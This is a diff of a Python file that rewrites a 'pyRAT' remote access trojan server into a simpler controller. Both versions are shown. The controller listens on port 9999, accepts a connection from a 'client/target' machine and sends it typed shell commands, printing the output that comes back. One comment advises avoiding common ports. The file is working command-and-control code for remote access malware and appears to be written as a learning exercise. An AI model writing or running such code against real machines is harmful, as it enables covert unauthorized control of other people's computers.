@@ -1,77 +1,68 @@
-"""
-Simple pyRAT server
-
-Usage: v_server.py -p PORT
-
-Notes: Listen for remote connections on port, send commands to remote v_client
-
-"""
-
-
-import sys
 import socket
-import argparse
-import threading
+import sys
 
 
-# Global Variables
-clients = {}
+# socket to allow 2 computers to connect
 
-
-def serve_client(client):
+def create_socket():
     try:
-        # get command to be executed on v_clients machine
-        print("Enter a command to execute: ")
-        user_input = sys.stdin.read()
-        client.send(user_input)
+        global host
+        global port
+        global s
+        host = ''
+        port = 9999
+        # don't use common ports like 80, 3389
 
-        while True:
-            # wait for data from listener
-            received_data = client.recv(4096)
-
-            print(received_data)
-
-            # wait for more input
-            user_input = input("")
-            user_input += "\n"
-            client.send(user_input)
-    except:
-        print("[-] Client closed connection...")
-        exit(0)
-        pass
+        s = socket.socket()  # actual conversation between server and client
+    except socket.error as msg:
+        print("Error creating socket: " + str(msg))
 
 
-def server_listen(port_number):
-
-    target_host = "0.0.0.0"
-
-    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    listener.bind((target_host, port_number))
-
-    # listen for max of 25 lines
-    listener.listen(25)
-    print("[+] Server is listening on port ", str(port_number), "...")
-    while True:
-        client, address = listener.accept()
-        print("[+] Incoming Connection from %s:%d" % (address[0], address[1]))
-        clients[address[0]] = client
-        client_serve_thread = threading.Thread(target=serve_client, args=(client,))
-        client_serve_thread.start()
+# binds socket to port and wait for connection from client/target
+def socket_bind():
+    try:
+        global host
+        global port
+        global s
+        host = '0.0.0.0'  # localhost
+        print("Binding socket to port: " + str(port))
+        s.bind((host, port))  # host: usually an IP address, but since we listening to our own machine, it is blank
+        s.listen(5)
+        # listen 5 is number of bad connections it will take before refusing
+    except socket.error as msg:
+        print("Error binding socket to port: " + str(msg) + "\n" + "Retrying...")
+        socket_bind()  # recursion, keeps trying if error happens
 
 
-def parse():
-    parser = argparse.ArgumentParser("v_server")
-    parser.add_argument("-p", "--port", type=int, help="port to connect with", default=9999)
-    args = parser.parse_args()
-    port_number = args.port
-    return port_number
+# establish connection with client (socket must be listening for connections)
+def socket_accept():
+    conn, address = s.accept()
+    print("Connection has been established | IP " + address[0] + " | Port " + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+
+def send_commands(conn):
+    while True:  # infinite loop for connection to stay constant
+        cmd = input()  # cmd = command we type into terminal to send to client
+
+        # whatever we type into command line and when running/storing commands is of byte type
+        # whenever we want to send across network, need to be of byte type
+        # to print out for user, need to be changed to string
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:  # check that the command is not empty, otherwise do not send across network
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")  # 1024 is buffer size, utf-8 to convert to normal string
+            print(client_response, end="")  # default end = '\n', change it to '' so don't give new line at the end
 
 
 def main():
-    port_number = parse()
-    server_listen(port_number)
+    create_socket()
+    socket_bind()
+    socket_accept()
 
 
-if __name__ == '__main__':
-    # call the main function
-    main()
+main()
